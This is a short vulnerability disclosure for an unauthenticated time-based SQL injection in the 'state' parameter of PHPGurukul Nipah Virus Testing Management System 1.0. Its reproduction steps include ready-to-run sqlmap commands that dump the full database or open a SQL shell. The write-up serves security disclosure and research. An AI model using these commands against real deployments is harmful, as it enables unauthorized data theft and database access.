## SQL Injection at state 


**Bug Description:**

An unauthenticated Time-Based SQL injection found in PHPGurukul Nipah virus (NiV) – Testing Management System 1.0 via POST parameter state allows a remote attacker to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database.

**Steps to Reproduce:** 

```
# Exploit Title: Unauthenticated Time-Based SQL injection found in PHPGurukul Nipah virus (NiV) – Testing Management System 1.0
# Date: 22-10-2023
# Exploit Author: rumble773
# Vendor Homepage: https://phpgurukul.com/
# Software Link: https://phpgurukul.com/nipah-virus-niv-testing-management-system-using-php-and-mysql/
# Version: 1.0
# Tested on: firefox/chrome
# CVE : 
```

To reproduce:

1- Start BurpSuite.
2- Head to the `nipah-tms/new-user-testing.php` endpoint.
3- Fill the information all in normal way and make sure to capture the request using BurpSuite or any other tool.
4- Save the request to a txt file. 
5- Using the sqlmap utility you can export the whole database or spawn a sql shell 

Commands: 
```
sqlmap -r state.req -v 0 --level 2 --risk 2 --dbms mysql --tamper space2comment,randomcase -p state --dump --batch
sqlmap -r state.req -v 0 --level 2 --risk 2 --dbms mysql --tamper space2comment,randomcase -p state --sql-shell --batch
```


POC:
![image](https://github.com/rumble773/sec-research/assets/76521427/4bcafe29-9e00-4e3e-b153-8b60e0cd6983)
